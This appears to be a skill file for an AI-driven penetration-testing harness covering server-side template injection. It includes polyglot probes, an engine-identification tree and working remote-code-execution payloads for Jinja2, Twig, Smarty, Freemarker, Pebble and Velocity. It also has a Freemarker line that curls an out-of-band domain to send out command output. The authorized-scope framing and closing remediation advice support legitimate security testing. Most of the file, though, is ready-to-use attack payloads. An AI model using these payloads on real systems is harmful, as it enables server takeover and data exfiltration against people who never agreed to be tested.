---
name: web-ssti-engine-rce
description: Server-Side Template Injection identification decision tree, polyglot detection, Jinja2/Twig/Freemarker/Pebble/Velocity engine RCE payloads, and sandbox escape techniques.
---

# Server-Side Template Injection (SSTI) & Engine RCE

## 1. Prerequisites & Input Contract
- **Authorization Scope:** Verified target web applications, user profile inputs, email templates, invoice/report generators in `.hacker-harness/scope.yaml`.
- **Target Parameters:** Text inputs reflected in server-rendered templates, custom template editors, markdown/HTML parsers.
- **Traffic Routing:** Route all test requests through Caido proxy.

---

## 2. Core Attack Heuristics & Step-by-Step Flow

### Step 1: Polyglot Injection & Engine Detection Tree
Inject universal template probe strings:
```text
${{<%[%'"}}%\
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
*{7*7}
```

Follow the standard engine differentiation decision tree:
```text
                  {{7*7}}
                 /       \
            Returns 49   Returns {{7*7}}
              /              \
         {{7*'7'}}         ${7*7}
        /         \        /    \
   Returns 49   Returns   49   Returns ${7*7}
      /          7777777   |           \
  (Twig)            /   (Mako/ES6)   <%= 7*7 %>
              (Jinja2)                 (ERB/EJS)
```

### Step 2: Engine-Specific RCE Payload Execution

#### Python (Jinja2 / Flask / Werkzeug):
```text
# Read file via subclass traversal
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### PHP (Twig / Smarty):
```text
# Twig (<3.0)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Smarty
{Smarty_Internal_Write_File::writeFile('test.php','<?php phpinfo(); ?>',self::clearConfig())}
{system('id')}
```

#### Java (Freemarker / Velocity / Pebble):
```text
# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }

# Pebble
{% set cmd = 'id' %}
{{ beans.get('java.lang.Runtime').getRuntime().exec(cmd) }}

# Velocity
#set($engine="")
#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
```

### Step 3: Blind SSTI Verification (Time & OOB)
When template output is not rendered back in the HTTP response:
```text
# Python Jinja2 Time Delay
{{ self.__init__.__globals__.__builtins__.__import__('time').sleep(5) }}

# Java Freemarker DNS Exfiltration
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("curl http://{{ oob_domain }}/$(whoami)") }
```

---

## 3. Empirical Disclosed Report Patterns & High-Risk Matrices

| Application Context | Underlying Template Engine | Empirical Disclosed Pattern | Expected Evidence Marker |
|---|---|---|---|
| **Invoice / PDF Generation** | Jinja2 / Weasyprint | User organization name set to `{{7*7}}` $\rightarrow$ PDF displays `49` | Full server command execution in PDF |
| **Email Notification Customizer** | Freemarker / Velocity | Admin customizes invite email with `${ex("id")}` | Reverse shell or command output in email |
| **SaaS Dashboard Branding** | Twig / Smarty | Custom header text template contains `{{_self.env...}}` | Server `/etc/passwd` or command execution |
| **Markdown / CMS Extension** | Pebble / Mako | Blog post markdown contains `<% import os %>` | Command output rendered in HTML |

---

## 4. Evidence Collection & Validation Gate
1. **Self-Contained Proof:** Capture HTTP request showing injected template expression and HTTP response showing evaluated mathematical result or non-destructive command output (e.g. `uid=1000(app) gid=1000(app)`).
2. **Impact Proof:** Demonstrate code execution safely (e.g. `id`, `uname -a`, or benign time delay) without destructive system modification.
3. **Remediation:** Never concatenate user input directly into template strings; pass user input strictly as template context variables, and configure sandbox restrictions with restricted classloaders.
